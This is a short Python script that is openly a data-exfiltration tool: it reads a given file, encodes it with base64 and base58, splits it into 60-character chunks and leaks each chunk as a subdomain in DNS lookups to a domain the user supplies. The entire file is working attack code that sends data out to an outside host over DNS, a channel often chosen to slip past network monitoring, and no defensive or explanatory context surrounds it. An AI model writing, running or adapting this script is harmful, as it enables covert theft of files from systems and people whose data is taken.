#!/usr/bin/python3
import base64
import base58
import socket
import sys

def main(file, domain):
	handle = open(file, "r")
	data = handle.read().strip()

	data = base64.b64encode(data.encode())
	data = base58.b58encode(data).decode("UTF-8")

	ptr = 0
	chunk = ""
	for i in range(len(data)):
		if ptr % 60 == 0 and ptr != 0:
			socket.getaddrinfo(f"{chunk}.{domain}", 80)
			chunk = ""
		chunk += data[i]
		ptr += 1
	socket.getaddrinfo(f"{chunk}.{domain}", 80)
	handle.close()


if __name__ == "__main__":
	if len(sys.argv) == 3:
		main(sys.argv[1], sys.argv[2])
	else:
		print("usage: <file-to-exfiltrate> <domain-to-exfiltrate-to>")